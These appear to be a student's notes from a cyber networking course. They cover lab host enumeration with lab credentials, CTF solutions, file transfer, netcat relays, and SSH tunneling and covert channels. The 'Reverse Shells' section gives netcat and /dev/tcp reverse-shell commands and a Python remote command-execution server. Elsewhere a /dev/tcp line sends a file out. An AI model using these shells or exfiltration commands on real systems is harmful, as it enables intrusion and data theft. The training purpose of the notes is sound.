     eth2 ether 172.16.101.2 , fa:16:3e:90:0f:13 , Linux 4.19.0-18 Debian , known creds : net1_student1:password14, ports:       22
     
     ^these are all hosts, and you can ssh into each of them with the creds: net_student1:password1

     interface ethernet:
      eth 0 172.16.120.1/29 Description 'INTERNET' , fa:16:3e:0f:8a:8a <><><><><>
      eth1 172.16.120.10/29 Description 'REDNET', hostname: RED-SCR (Donovian Boundary) 
                         172.16.120.9, fa:16:3e:eb:49:e6, vyos 1.1.7 , known creds vyos:password, ports 22 (router), hostname RED-IPs (device connected to donovian boundary on eth1) ,
                               (1)   eth0             172.16.120.9/29                   u/u  INTERNET 
                                                 (1) 172.16.120.12,  fa:16:3e:0f:8a:8a
                               (1)   eth1             172.16.120.18/29                  u/u  REDNET 
                                       172.16.120.17            ether   fa:16:3e:9e:5b:43   C                     eth1 , host name , RED-POP, vyos 1.1.7,  (Inner Boundary)
                                              eth0             172.16.120.17/29                  u/u  INTERNET 
                                                  (1) 172.16.120.18            ether   fa:16:3e:e9:25:1e   C                     eth0
                                              eth1             172.16.182.126/27                 u/u  REDHOSTS 
                                                  (1) 172.16.182.106, ports 22 , (T4) , Linux 3.1, hostname red-host-1 , 
                                                  (2) 172.16.182.110, ports 22 80 1980 1982 1988 1989 (TCP) & 1984 1989                                                           (UDP), (T2), Linux 3.1
                                                  (3) 172.16.182.114 ports 22 , (T5) Linux 3.1 , hostname red-host-3
                                                  (4) 172.12.182.118, ports 22 , (T6) Linux 3.1, hostname red-host4
                                                  (5) 172.16.182.126, ports 22, Linux 3.2
                                              eth2             172.16.140.6/29                   u/u  REDINTDMZ 
                                                      (1) 172.16.140.5/29 , hostname: REP-POP2,
                                                               eth1             172.16.140.62/27                  u/u  REDINTDMZ2
                                                      (2) 172.16.140.62/27 
                                                          172.16.140.6/29   
                                                          172.16.140.33, ports 22 80 2305 2800 2828 (TCP) , (T3)
                                                               172.16.140.35, ports 22 , (T7) , hostname red-int-dmz2-host-2 , creds net1_student14:password14
                                                           
                                               

      eth2 172.16.101.30/27 Description 'DMZ' , creds: vyos:password, hostname : RED-SCR
                      eth0             172.16.120.1/29      

                      
    
FLAGS:
show interfaces (this will show the total number of host devices. In this case it's only one, as only one has a different IP)
nmap -sV 172.16.101.30/27 (this will show you the total number of host device(s) under the DMZ network, which is 172.16.101.30/27)
                          (this will also get you the well known ports (in this case, just port 22))
ssh 172.16.101.2 (use the creds provided, and then run a hostname to get its hostname).
sudo nmap -sU 172.16.182.126/27 ( this will list hidden UDP ports)
echo "hello" | nc -u 172.16.82.106 53 (this will allow you to touch a port and prompt a question it may have, if any.).
          (the answer to this prompted question is 'which dig")
ping -s ( this can be used to send an abnormally large ICMP packet to the target).
 'eog hint-01.png' (this will open the image file so that you can get the hint).
    (The port range you get from the answer is 2000-2999)
traceroute 10.50.23.214 (this will get you the total number of hops from the Internet_host we're signed into, to the T1 host).
'nslookup -type=NS dtic.mil' or 'dig dtic.mil NS' (this will get you the total number of Name Server (NS) records for a given host)
sudo nmap -sU 172.16.140.33 -p 2000-2999 (this will get you the total number of UDP ports open within the specified range, for the specified ip address)
nslookup dtic.mil, whois 214.48.252.101 (the nslookup will resolve the domain name to an IP address. From there you can use the whois command to successfully get the associated city and state, and other info).
36). echo "hello" | nc -u 172.16.140.33 2000 (the -u option will allow you to use the 'nc' command on UDP ports)
                start by looking up 214.48.252.101 on https://hackertarget.com/as-ip-lookup/ to get the ASN
                look up the found ASN (27064) on https://bgpview.io/asn/27064#info. This explore this page and you'll see your answer.
          

37). echo "hello" | nc -u 172.16.140.33 2011
                to get this one, try running dig on 208.64.202.36 (resolved IP for steampowered.com)
                look up dnslookup.com, and put in the domain name (steampowered.com)
To get a SSL Certificate issuer, go to the provided website and look at the 'Site information' button on the left side of the address bar. 
http://archive.org/web/ (This site can be used to find a history of websites that no longer exists on the ordinary world wide web).
















  File Transfer 
      And
   Redirection
=========================
=======   Day 4 =========
=========================



Standard file transfer methods
    Describe common file transfer methods
    Understand the use of Active and Passive FTP modes
    Use SCP to transfer files


Describe common methods for transferring data
    TFTP
    FTP
    Active
    Passive
    FTPS
    SFTP
    SCP

TFTP (#Trivial File Transfer Protocol#)
    RFC 1350 Rev2
    UDP transport
    Extremely small and very simple communication
    No terminal communication
    Insecure (no authentication or encryption)
    No directory services
    Used often for technologies such as BOOTP and PXE

FTP (#File Transfer Protocol#)
    RFC 959
    Uses 2 separate TCP connections
    Control Connection (21) / Data Connection (20*)
    Authentication in clear-text
    Insecure in default configuration
    Has directory services
    Anonymous login

FTP Active
FTP Active for Anonymous
  Link for Demo of FTP Anonymous:
  https://net.cybbh.io/public/networking/latest/09_file_transfer/fg.html#_9_1_2_1_active
    For logging in with this method, recommend using 'wget', which does work with FTP. 
FTP Active for User:
  Link for Demo for FTP User:
  https://net.cybbh.io/public/networking/latest/09_file_transfer/fg.html#_9_1_2_1_active
  
FTP Passive (You can reach the server but the server cannot reach you)
  Link for Demo for FTP Passive:
  https://net.cybbh.io/public/networking/latest/09_file_transfer/fg.html#_9_1_2_2_passive
FTP Passive for Anonymous
  Link for Demo for FTP Passive Anonymous:
    https://net.cybbh.io/public/networking/latest/09_file_transfer/fg.html#_9_1_2_2_passive
FTP Passive for User
  Link for Demo for FTP Passive for User:
      https://net.cybbh.io/public/networking/latest/09_file_transfer/fg.html#_9_1_2_2_passive


FTPS (#File Transfer Protocol Secure#)
    Adds SSL/TLS encryption to FTP
    Interactive terminal access
    Explicit Mode: ports 20/21*
         Option for Encryption
    Implicit Mode: ports 989/990*
          Encrytion assumed


SFTP (#Secure File Transfer Protocol#)
    TCP transport (port 22)
    Uses symmetric and asymmetric encryption
    Adds FTP like services to SSH
    Authentication through sign in (username and password) or with SSH key
    Interactive terminal access

SCP (#Secure Copy Protocol#) (you don't get terminal access, but it's the easiest way to grab items securely. Remember, ssh starts with conducting an SSH into the target).
    SCP is the main way we'll me moving files during this mod. 
    TCP Transport (port 22)
    Uses symmetric and asymmetric encryption
    Authentication through sign in (username and password) or with SSH key
    Non-Interactive
SCP Options
  .  - Present working directory
  -v - verbose mode
  -P - alternate port (This is a big distinction from SSH at it is a capital 'P' instead of a lowercase 'p' as used in ssh).
  -r - recursively copy an entire directory
  -3 - 3-way copy

#SCP Syntax#
Download a file from a remote directory to a local directory
  $ scp student@172.16.82.106:secretstuff.txt /home/student

Upload a file to a remote directory from a local directory
  $ scp secretstuff.txt student@172.16.82.106:/home/student

Copy a file from a remote host to a separate remote host
  $ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
password:    password:

Recursive upload of a folder to remote
  $ scp -r folder/ student@172.16.82.106:

Recursive download of a folder from remote
  $ scp -r student@172.16.82.106:folder/ .

#SCP Syntax w/ alternate SSHD# (for when ssh is not port 22)
  Download a file from a remote directory to a local directory
    $ scp -P 1111 student@172.16.82.106:secretstuff.txt . (instead of using port 22 here, we use port 1111 as the alternate port. 
  Upload a file to a remote directory from a local directory
    $ scp -P 1111 secretstuff.txt student@172.16.82.106:

#SCP Syntax through a tunnel# 
  Create a local port forward to target device
    $ ssh student@172.16.82.106 -L 1111:localhost:22 -NT (opens port 1111 locally, so that the target you ssh into can connect back to you, the '-NT' option helps a lot. Look into it a little more)
  Download a file from a remote directory to a local directory
    $ scp -P 1111 student@localhost:secretstuff.txt /home/student
  Upload a file to a remote directory from a local directory
    $ scp -P 1111 secretstuff.txt student@localhost:/home/student
    
SCP Syntax through a #Dynamic Port forward# (
  Create a Dynamic Port Forward to target device
    $ ssh student@172.16.82.106 -D 9050 -NT
  Download a file from a remote directory to a local directory
    $ proxychains scp student@localhost:secretstuff.txt .
  Upload a file to a remote directory from a local directory
    $ proxychains scp secretstuff.txt student@localhost:


Conduct Uncommon Methods of File Transfer
    Demonstrate the use of Netcat for data transfer
    Perform traffic redirection using Netcat relays
    Discuss the use of named and unnamed pipes
    Conduct file transfers using /dev/tcp


NETCAT
NETCAT simply reads and writes data across network socket connections using the TCP/IP protocol.
    Can be used for the following:
        inbound and outbound connections, TCP/UDP, to or from any port
        troubleshooting network connections
        sending/receiving data (insecurely)
        port scanning (similar to -sT in Nmap)

NETCAT: Client to Listener file transfer
  Listener (receive file):
    nc -lvp 9001 > newfile.txt
  Client (sends file):
    nc 172.16.82.106 9001 < file.txt
    
NETCAT: Listener to Client file transfer
  Listener (sends file):
    nc -lvp 9001 < file.txt
  Client (receive file):
    nc 172.16.82.106 9001 > newfile.txt
  
NETCAT Relay Demos
Listener - Listener
      On Blue_Host-1 Relay:
        $ mknod mypipe p      (the named pipe will take the output of a command and sends it as the input to another command, it essentially creates a file marker in memory and doesn't save anything to the disk)
        $ nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe    (basically, anything that is the output of nc -lvp 1111, will become the named pipe, and will go to the next command)
      On Internet_Host (send):
        $ nc 172.16.82.106 1111 < secret.txt 
      On Blue_Priv_Host-1 (receive):
        $ nc 192.168.1.1 3333 > newsecret.txt

NETCAT Relay Demos
 Client - Client
        On Internet_Host (send):
          $ nc -lvp 1111 < secret.txt
        On Blue_Priv_Host-1 (receive):
          $ nc -lvp 3333 > newsecret.txt
        On Blue_Host-1 Relay:  
          $ mknod mypipe p
          $ nc 10.10.0.40 1111 < mypipe | nc 192.168.1.10 3333 > mypipe  

NETCAT Relay Demos
Client - Listener
        On Internet_Host (send):
          $ nc -lvp 1111 < secret.txt
        On Blue_Priv_Host-1 (receive):
          $ nc 192.168.1.1 3333 > newsecret.txt
        On Blue_Host-1 Relay:
          $ mknod mypipe p
          $ nc 10.10.0.40 1111 < mypipe | nc -lvp 3333 > mypipe

NETCAT Relay Demos
Listener - Client
        On Internet_Host (send):
          $ nc 172.16.82.106 1111 < secret.txt
        On Blue_Priv_Host-1 (receive):
          $ nc -lvp 3333 > newsecret.txt
        On Blue_Host-1 Relay:
          $ mknod mypipe p
          $ nc -lvp 1111 < mypipe | nc 192.168.1.10 3333 > mypipe
REMEMBER: You can do any sort of mixed combination of these ^. Knowing how to play with them is going to be key in completing your CTFs.
          Also, Listeners always come up first (if you have to start, or reestablish a connection)
                mknod mypipe
                nc 172.16.82.106 1111 < mypipe | nc -lvp 2222 > mypipe     (remember, the > operator will replace it. If you want to append to a file, use the >> operator)
     (Listener) nc 172.16.82.106 1111
      (Client)  nc 192.168.1.1 2222
      
File Transfer with /dev/tcp
        On the receiving box:
          $ nc -lvp 1111 > devtcpfile.txt
        On the sending box:
          $ cat secret.txt > /dev/tcp/10.10.0.40/1111
        This method is useful for a host that does not have NETCAT available.


Reverse Shells

Reverse shell using NETCAT
        First listen for the shell on your device.
          $ nc -lvp 9999
        On Victim using -c :
          $ nc -c /bin/bash 10.10.0.40 9999
        On Victim using -e :
          $ nc -e /bin/bash 10.10.0.40 9999
          
Reverse shell using /DEV/TCP
        First listen for the shell on your device.
          $ nc -lvp 9999
        On Victim:
          $ /bin/bash -i > /dev/tcp/10.10.0.40/9999 0<&1 2>&1


#Reverse shell Python3#
#!/usr/bin/python3
import socket
import subprocess
PORT = 1234        # Choose an unused port
print ("Waiting for Remote connections on port:", PORT, "\n")
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('', PORT))
server.listen()
while True:
    conn, addr = server.accept()
    with conn:
        print('Connected by', addr)
        while True:
            data = conn.recv(1024).decode()
            if not data:
                break
            proc = subprocess.Popen(data.strip(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, err = proc.communicate()
            response = output.decode() + err.decode()
            conn.sendall(response.encode())
server.close()



Understanding Packing and Encoding
    Discuss the purpose of packers
    Perform Hexadecimal encoding and decoding
    Demonstrate Base64 encoding and decoding
    Conduct file transfers with Base64

Packers
    Special code added to programs to compress executables
    Reduces network traffic
    Used for obfuscation
    Reduces time on target
    Example: UPX

Encoding and Decoding
    Specialized formatting
    Used for transmission and storage
    Hex and Base64 are the most common
    NOT Compression
    NOT Encapsulation
    NOT Encryption

Hexadecimal Encoding and Decoding
    Converts the binary representation of a data set to the 2 digit base-16 equivalent.
    Used by IPv6 and MAC addresses
    Color schemes
    Increases readability and information density


xxd example
    echo a string of text and use xxd to convert it to a plain hex dump with the -p switch\
      $ echo "Hex encoding test" | xxd -p
      48657820656e636f64696e6720746573740a
    echo hex string and use xxd to restore the data to its original format
      $ echo "48657820656e636f64696e6720746573740a" | xxd -r -p
      Hex encoding test

Base64 Encoding and Decoding
    binary-to-text encoding
        A-Z, a-z, 1-9, +, /
    6 bits per non-final digit
        (4) 6-bit groups per (3) 8-bit groups
    padding used to fill in any unused space in each 24-bit group

Transfer file with Base64
    generate the base64 output of a file, with line wrapping removed
      $ base64 -w0 logoCyber.png
    copy the output

Transfer file with Base64
  create a new file on your machine
      $ nano b64image.pn  
    paste, save & exit
  decode from base64 with -d
      $ base64 -d b64image.png > logoCyber.png


      

CTF Challenges Netcat Relay:
       T1  (Internet Host/Me) = 10.50.30.41
       RELAY (Blue-int-dmz-host-1) = 172.16.40.10 
       T2  (Blue_Host-4) = 172.16.82.115

  start: 
1).   (from RELAY): nc -lvp 1234 > file.jpg 
      (from Internet_host): nc -lvp 1111 > file1.jpg
      (from RELAY): nc 10.10.0.40 1111 < file.jpg (10.10.0.40 is the internal IP, which we use to txfer this)
      (from Internet_host): [ctrl + c] and check for the file. 
                         steghide extract -sf file1.jpg
                         (file is extracted)
                         cat phrase1.txt | md5sum
                         you now have your answer.
                      


  start: 
2).   (from RELAY): nc 4321 > 2steg.jpg
      (from Internet_host): nc -lvp 1111 > 2steg.jpg
      (from RELAY): nc 10.10.0.40 1111 < 2steg.jpg
      (from Internet_host): [ctrl + c ]  and check for file
                            steghide extract -sf 2steg.jpg
                            (file is extracted)
                            cat phrase2.txt | md5sum
                            you now have your answer.

3).   (from RELAY): nc 172.16.82.115 6789 > 3steg.jpg (this one is contacting T2 and basically saying "I've made contact, give me the message" and that's how you get it)
      (from Internet_host): nc -lvp 1111 > 3steg.jpg
      (from RELAY): nc 10.10.0.40 1111 < 3steg.jpg
      (from internet_host): [ctrl + c] and check for file
                            steghide extract -sf 3steg.jpg
                            cat phrase3.txt | md5sum
                            you now have your answer

4).   (from RELAY) nc 172.16.82.115 9876 > 4steg.jpg
      (from Internet_host): nc -lvp 1111 > 4steg.jpg
      (from RELAY): nc 10.10.0.40 1111 < 4steg.jpg
      (from internet_host): [ctrl + c ]  and check for file
                            steghide extract -sf 4steg.jpg
                            (file is extracted)
                            cat phrase4.txt | md5sum
                            you now have your answer.






GySgt Stone's Methodology
=========================
Whenever you finish, take notes. Improve your toolkit as you put it together. 
Cryptic notification from: 
RIP - BOB floats 10.50.23.190

Create a diagram.
Create a square that says "Hostname: BOB??? Ip: Ports:"
start by trying to ssh into Bob. 
no success?
pay attention to the error message.
"Connection closed by remote host"
Figure out what's on the ssh port, because something is there. 
Try banner grabbing. 
nc 10.50.23.190
"this is not the port you are looking for. Try again"
Okay, so... they're playing games with you. Try to nmap next! see what ports are open. 
nmap -Pn 10.50.23.190 -p - -T5            ('-'all the ports, also T5 is okay to use on the first box in)
ports open!: 21, 22, 25, 90, 443, 3389    (ftp and http are free info!)
take a screenshot and copy the info to your diagram.
run a 'wget -r 10.50.23.190' 
it worked? Yes.
try 'wget -r ftp://10.50.23.190' 
this one didn't work. 
see what you got from the wget for now (http)
ls 10.50.23.190
eom 10.50.23.190/index.html
try to nc it:
nc 10.50.23.190  21
ftp 10.50.23.190
try username: bob
try password: bob
Now that you're in the fpt session:
  ftp> ls
     no info
     > exit
Update your map, show what you've got from the ports you've exploited.
try the port 25. 
nc 10.50.23.190 25
  provided an ssh version! seems like they designed ssh to port 25 instead. 
ssh 10.50.23.190 -p 25
  no success? it says permission denied. BUT, this implies the service is still up and running.
ssh bob@10.50.23.190 -p 25 
  but we don't have the creds for bob... how can we do this?
    sniff and wait on the port with wireshark until somebody tries to telnet in.
  bobs password: password.
Now you're in!
enumerate system info. 
  ip addr
    you found the real ip (as opposed to the float, which should never be relied on)
      'ip neig' will get you the ip addresses you have talked to. 
      you can also ping sweep the entire range to get all addresses in the network! try it, at least:
    for i in {1..254}; do (ping -c 1 10.0.0.$i | grep "bytes from" &) ; done
  Now you've got a list of addresses that have been reached. 
Try testing port 443, from bob-host now!
  ss -ntlp

Split screen
  nc 10.50.23.190 443
    it's another fake port... let's move on, or if there's a hint work with it. 
  look for files 
    find / -iname "*.hint" 2>/dev/null
    find / -iname "*.flag" 2>/dev/null
    find / -name "hint*" 2>/dev/null
    ! there was a hint found. 
    cat /srv/ftp/hint.txt
      It gave you a hint. 
dynamic tunnel
ssh bob@10.50.23.190 -p 25 -D 9050 -NT (this will create a dynamic tunnel, 9050 is the port you opened on you local machine)
ss -ntlp 
run:  'proxychains nmap -Pn 10.0.0.101/24 -p 20-23,80 -T5' or 'proxychains nmap -Pn 10.0.0.101-105 -p 20-23,80 -T5' or 'proxychains nmap -Pn 10.0.0.101,124 -p 20-23,80 -T5'





















#SSH Tunneling and Covert Channels#
==================
==    Day 5     ==
==================








OUTCOMES
    Discuss Local and Dynamic SSH Tunneling
    Demonstrate Local and Dynamic Port Forward
    Discuss Remote Port Forwarding
    Demonstrate Remote Port Forwarding


Rationale
Understanding tunneling, covert channels, steganography,
and SSH tunneling is crucial for cybersecurity professionals
to comprehend various methods used for data encapsulation,
concealment, and secure communication. Tunneling involves
encapsulating one protocol within another, enabling secure
transmission of data across untrusted networks. Covert
channels allow clandestine communication by exploiting unused
or less-monitored network protocols or channels, posing a
significant risk for data exfiltration or command and control
activities. Steganography conceals secret information within
seemingly innocuous data, making it imperceptible to casual
observers. SSH tunneling provides a secure encrypted channel
for remote access and data transfer, safeguarding sensitive
information from interception or manipulation. Mastery of
these concepts equips cybersecurity practitioners with the
knowledge and tools necessary to detect, prevent, and mitigate
potential threats to data confidentiality, integrity, and
availability.




Overview of Tunneling
    Tunneling - Tunneling encapsulates a protocol inside another protocol.
        Encapsulation
        Transmission
        Decapsulation

    Overview of Tunneling
        Tunneling used in the IPv6 Transition
        IPv6 over IPv4
        Dual Stack
        6in4
        6to4
        4in6
        Teredo
        ISATAP

    Overview of Tunneling
      Traffic Tunneling
        Mainly used for the IPv4 to IPv6 migration
      Tunneling Malware and Attacks
        Bypass IPv4-based security measures


    IPv6 over IPv4
      Permits IPv6 to be encapsulated in order to move through a IPv4 network
      Done by the Dual Stack Router
      Payload is not generally encrypted
      IPSEC commonly used to secure the payloads

    Dual Stack
          Configures an IPv4 and IPv6 address on all devices
    Resource intensive
        Allows for IPv4 and IPv6 routing because it has the addresses already set
    Can use both but not interchangeably


    #6 in 4#:
      Tunnel IPv6 traffic in an IPv4 Generic Routing Encapsulation (GRE) tunnel
      Simple and deterministic
      Must be configured manually
      Commonly used for connecting IPv6 islands over an IPv4 network.
      Uses IP protocol 41
      Allows for IPv6 packets to be sent over an IPv4 network
      Enables automatic tunneling of IPv6 packets over an IPv4 network.
      Uses 6to4 gateways that encapsulate IPv6 packets within IPv4 packets.
      Allows communication between IPv6 networks across IPv4 infrastructure.
      Uses IP protocol 41
  
    #4 to 6#:
      Reverse of 6 to 4
      Uses Next Header 4

    #Teredo Tunneling#:
      RFC 4380
      Allows IPv4 clients to access IPv6 clients
      Encapsulates IPv6 packets within UDP
      Commonly used for devices behind NAT
      Uses the 2001:0000::/32 prefix
    
    #ISATAP#:
      Allows IPv6 hosts to communicate over an IPv4 network within a site (local network)
      Can be used over the internet for specific site-to-site communications.
      Generates a Link-Local address using its IPv4 address
      192.168.199.99 → FE80::0000:5EFE:c0a8:c763

    Covert Channels vs Steganography

    Covert Channels:
      Using common and legitimate protocols to transfer data in illegitimate ways.
      Unauthorized/hidden communication between entities.
      Utilizes computer system resources, mechanisms, or protocols.
      Transmits information contrary to design intent.
      Bypasses security, violates policies, leaks sensitive data.
      
    Type of Covert Channels:
      Storage
        Payload
        Header (you have to look at these to see what is being modified)
            IP Header (TOS, IP ID, Flags + Fragmentation, and Options) 
            TCP Header (Reserved, URG Pointer, and Options)
        Timing
            Modifying transmission of legitimate traffic
            Delaying packets between nodes
            Watch TTL changes
            Watch for variances between transmissions

      Common Protocols used with Covert Channels
        ICMP
        DNS
        HTTP

      #How to Detect Covert Channels#:
        Host Analysis
          Requires knowledge of each applications expected behavior.
        Network Analysis
          A good understanding of your network and the common network protocols being used is the key
        Baselining of what is normal to detect what is abnormal


      #Detecting Covert Channels with ICMP#:
        ICMP works with one request and one reply answer
          Type 8 code 0 request
          Type 0 code 0 answer
        Check for:
          Payload imbalance
          Request/responce imbalance
          Large payloads in response
        ICMP Covert Channel Tools:
          ptunnel
          Loki
          007shell
          ICMP Backdoor
          B0CK
          Hans

      Detecting Covert Channels with DNS
      
    DNS is a request/response protocol
      1 request typically gets 1 response
      Payloads generally do no exceed 512 bytes
      Check for:
        Request/response imbalances
        Unusual payloads
        Burstiness or continuous use
    DNS Covert Channel Tools:
      OzymanDNS
      NSTX
      dns2tcp
      iodine
      heyoka
      dnsct2

    #Detecting Covert Channels with HTTP#:
    Request/Response protocol to pull web content
      GET request may include .png, .exe, .(anything) files
      Can vary in sizes of payloads
      Typically "bursty" but not steady
    HTTP Covert Channel Tools:
      tunnelshell tools
      HTTPTunnel
      SirTunnel
      go HTTP tunnel

    Steganography
      Hiding messages inside legitimate information objects.
        Methods:
           Injection
           Substitution
           Propagation
      Steganography Injection:
        Done by inserting message into the unused (whitespace) of the file, usually in a graphic
          Second most common method
          Adds size to the file
          Hard to detect unless you have original file
            tools:
              StegHide
      Steganography Substitution
          Done by inserting message into the insignificant portion of the file
          Most common method used
          Elements within a digital medium are replaced with hidden information
          Example:
            Change color pallate (+1/-1)
      Steganography Propagation
          Generates a new file entirely
          Needs special software to manipulate file
            tools:
              StegSecret
              HyDEn
              Spammimic


      #Secure Shell (SSH Tunneling)#
        Various Implementations (v1 and v2)
        Provides authentication, encryption, and integrity.
        Allows remote terminal sessions
        Can enable X11 Forwarding
        Used for tunneling and port forwarding
        Proxy connections
      SSH Architecture
        Client vs Server vs Session
          Keys:
            User Key - Asymmetric public key used to identify the user to the server
            Host Key - Asymmetric public key used to identify the server to the user
            Session Key - Symmetric key created by the client and server to protect the session’s communication.
      Configuration Files
         Client Configuration File (/etc/ssh/ssh_config)
         Server Configuration File (/etc/ssh/sshd_config)
         Known Hosts File (~/.ssh/known_hosts)
      SSH Components:
         https://net.cybbh.io/public/networking/latest/08_tunneling/fg.html#_4_4_2_components_of_ssh_architecture
      SSH Architecture:
         https://net.cybbh.io/public/networking/latest/08_tunneling/fg.html#_4_4_3_ssh_architecture

      #SSH First Connect#
        student@internet-host:~$ ssh student@172.16.82.106
        The authenticity of host '172.16.82.106 (172.16.82.106)' can't be established.
        ECDSA key fingerprint is SHA256:749QJCG1sf9zJWUm1LWdMWO8UACUU7UVgGJIoTT8ig0.
        Are you sure you want to continue connecting (yes/no)? yes
        Warning: Permanently added '172.16.82.106' (ECDSA) to the list of known hosts.
        student@172.16.82.106's password:
        student@blue-host-1:~$
      You will need to approve the Server Host (Public) Key
      Key is saved to /home/student/.ssh/known_hosts
      
      #SSH Re-Connect#
        ssh student@172.16.82.106
        student@172.16.82.106's password:
        student@blue-host-1:~$
      Further SSH connections to server will not prompt to save key as long as key does not change

      #SSH Host key Changed#
        ssh student@172.16.82.106
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
        Someone could be eavesdropping on you right now (man-in-the-middle attack)!
        It is also possible that a host key has just been changed.
        The fingerprint for the ECDSA key sent by the remote host is
        SHA256:RO05vd7h1qmMmBum2IPgR8laxrkKmgPxuXPzMpfviNQ.
        Please contact your system administrator.
        Add correct host key in /home/student/.ssh/known_hosts to get rid of this message.
        Offending ECDSA key in /home/student/.ssh/known_hosts:1
        remove with:
        ssh-keygen -f "/home/student/.ssh/known_hosts" -R "172.16.82.106"
        ECDSA host key for 172.16.82.106 has changed and you have requested strict checking.
        Host key verification failed.
        
      #SSH Key Change Fix#
          ssh-keygen -f "/home/student/.ssh/known_hosts" -R "172.16.82.106"
       Copy/Paste the ssh-geygen message to remove the Host key from the known_hosts file

      #SSH Port Forwarding#
          Creates channels using SSH-CONN protocol
          Allows for tunneling of other services through SSH
          Provides insecure services encryption
      SSH Options:
        -L - Creates a port on the client mapped to a ip:port via the server
        -D - Creates a port on the client and sets up a SOCKS4 proxy tunnel where the target ip:port is specified dynamically
        -R - Creates the port on the server mapped to a ip:port via the client
        -NT - Do not execute a remote command and disable pseudo-tty (will hang window)

      #Local Port Forwarding#
        ssh -p <optional alt port> <user>@<server ip> -L <local bind port>:<tgt ip>:<tgt port>
        or
        ssh -L <local bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<server ip>

      #Local Port Forward to localhost of server#
        Internet_Host:
          ssh student@172.16.1.15 -L 1122:localhost:22
          or
          ssh -L 1122:localhost:22 student@172.16.1.15

          Internet_Host:
          ssh student@localhost -p 1122
          Blue_DMZ_Host-1~$
        Local Port Forward to Localhost of Server:
          https://net.cybbh.io/public/networking/latest/08_tunneling/fg.html#_4_5_1_1_local_port_forward_to_localhost_of_server
        
        Local Port Forward to localhost of server
          Internet_Host:
            ssh student@172.16.1.15 -L 1123:localhost:23
            or
            ssh -L 1123:localhost:23 student@172.16.1.15
          Internet_Host:
            telnet localhost 1123
            Blue_DMZ_Host-1~$
          Local Port Forward to Locahost of Server:
              Internet_Host: https://net.cybbh.io/public/networking/latest/08_tunneling/fg.html#_4_5_1_1_local_port_forward_to_localhost_of_server

        #Local Port Forward to localhost of server#
          Internet_Host:
            ssh student@172.16.1.15 -L 1180:localhost:80
            or
            ssh -L 1180:localhost:80 student@172.16.1.15         
          Internet_Host:
            firefox http://localhost:1180
            {Webpage of Blue_DMZ_Host-1}
          Local Port Forward to localhost of server:
            https://net.cybbh.io/public/networking/latest/08_tunneling/fg.html#_4_5_1_1_local_port_forward_to_localhost_of_server

        #Local Port Forward to remote target via server#
          Internet_Host:
            ssh student@172.16.1.15 -L 2222:172.16.40.10:22
            or
            ssh -L 2222:172.16.40.10:22 student@172.16.1.15
          Internet_Host:
            ssh student@localhost -p 2222 (this would take you through you loopback, through port 2222, and through that, allow you to bypass port 22. It's a work around. The 2222 is hidden.
                                           If you're on the lookback of student host, this is how you'll get through. Otherwise the tunnel won't work. Notice how you're ssh'ing into 'student@localhost'.)
            Blue_INT_DMZ_Host-1~$
          Local Port Forward to remote target via server:
            https://net.cybbh.io/public/networking/latest/08_tunneling/fg.html#_4_5_1_2_local_port_forward_to_remote_target_via_server
        
        #Local Port Forward to remote target via server#
            Internet_Host:
              ssh student@172.16.1.15 -L 2223:172.16.40.10:23
              or
              ssh -L 2223:172.16.40.10:23 student@172.16.1.15
            Internet_Host:
              telnet localhost 2223
              Blue_INT_DMZ_Host-1~$
            Local Port Forward to remote target via server:
              https://net.cybbh.io/public/networking/latest/08_tunneling/fg.html#_4_5_1_2_local_port_forward_to_remote_target_via_server

          #Local Port Forward to remote target via server#
            Internet_Host:
                ssh student@172.16.1.15 -L 2280:172.16.40.10:80
                or
                ssh -L 2280:172.16.40.10:80 student@172.16.1.15
            Internet_Host:
                firefox http://localhost:2280 (this opens a web browser to connect to port 2280, the port opened in the ssh session prior to this command
                                               NOTE: Sometimes it's easier just to use wget after opening the tunnel, rather than opening the slow web browser)
                {Webpage of Blue_INT_DMZ_Host-1}
            Local Port Forward to remote target via server:
                https://net.cybbh.io/public/networking/latest/08_tunneling/fg.html#_4_5_1_2_local_port_forward_to_remote_target_via_server

          #Forward through Tunnel#
                Internet_Host:
                  ssh student@172.16.1.15 -L 2222:172.16.40.10:22
                  ssh student@localhost -p 2222 -L 3322:172.16.82.106:22
                Internet_Host:
                  ssh student@localhost -p 3322
                  Blue_Host-1~$
          Forward through Tunnel:
            https://net.cybbh.io/public/networking/latest/08_tunneling/fg.html#_4_5_1_3_local_port_forward_through_a_previously_established_port_forward_to_extend_a_tunnel

          #Forward through Tunnel#
            Internet_Host:
                ssh student@172.16.1.15 -L 2222:172.16.40.10:22
                ssh student@localhost -p 2222 -L 3323:172.16.82.106:23
            Internet_Host:
                telnet localhost 3323
                Blue_Host-1~$
            Forward through Tunnel:
                https://net.cybbh.io/public/networking/latest/08_tunneling/fg.html#_4_5_1_3_local_port_forward_through_a_previously_established_port_forward_to_extend_a_tunnel
            Internet_Host:
                ssh student@172.16.1.15 -L 2222:172.16.40.10:22
                ssh student@localhost -p 2222 -L 3380:172.16.82.106:80
            Internet_Host:
                  firefox http://localhost:3380
                  {Webpage of Blue_Host-1}
            Forward through Tunnel:
                https://net.cybbh.io/public/networking/latest/08_tunneling/fg.html#_4_5_1_3_local_port_forward_through_a_previously_established_port_forward_to_extend_a_tunnel


            #Dynamic Port Forwarding#
                ssh <user>@<server ip> -p <alt port> -D <port>
                or
                ssh -D <port> -p <alt port> <user>@<server ip>
              Proxychains default port is 9050
              Creates a dynamic socks4 proxy that interacts alone, or with a previously established remote or local port forward.
              Allows the use of scripts and other userspace programs through the tunnel.

          #SSH Dynamic Port Forwarding 1-Step#
          Internet_Host:
              ssh student@172.16.1.15 -D 9050  (You can only have 1 dynamic channel open at a time)
              or
              ssh -D 9050 student@172.16.1.15 
          #SSH Dynamic Port Forwarding 1-Step#:
              https://net.cybbh.io/public/networking/latest/08_tunneling/fg.html#_4_5_2_1_dynamic_port_forwarding_to_server (this is a pretty informative photo)
          #SSH Dynamic Port Forwarding 1-Step#
